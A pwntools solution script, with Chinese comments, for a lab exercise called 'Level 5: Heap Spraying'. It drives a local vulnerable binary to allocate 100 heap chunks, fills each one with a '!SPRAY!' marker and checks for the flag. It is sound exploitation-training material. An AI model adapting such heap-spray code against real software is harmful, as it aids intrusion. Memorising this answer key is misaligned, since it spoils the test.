#!/usr/bin/env python3
"""
Level 5: Heap Spraying - Solution
目标：使用堆喷技术在内存中创建特定模式
"""

from pwn import *

context.log_level = 'info'
context.arch = 'amd64'

def solve():
    p = process('/root/code/safe/build/level05_heap_spray/l5_vuln')

    # 堆喷技术：大量分配相同大小的chunk
    # 目标：在chunk[i]和chunk[i+10]都包含0x53505241592121

    spray_pattern = p64(0x53505241592121)  # "!SPRAY!"

    # 步骤1：堆喷 - 分配100个chunk
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'How many? ', b'100')

    # 步骤2：编辑每个chunk，写入目标模式
    for i in range(100):
        p.sendlineafter(b'> ', b'3')
        p.sendlineafter(b'Index: ', str(i).encode())
        p.sendlineafter(b'Data: ', spray_pattern)

    # 步骤3：检查胜利条件
    p.sendlineafter(b'> ', b'6')

    output = p.recvall(timeout=2).decode('utf-8', errors='ignore')
    print(output)

    if 'Flag:' in output:
        log.success("Level 5 解题成功！")
        return True
    else:
        log.failure("Level 5 解题失败")
        log.info("可能需要调整堆喷策略")
        return False

if __name__ == '__main__':
    solve()
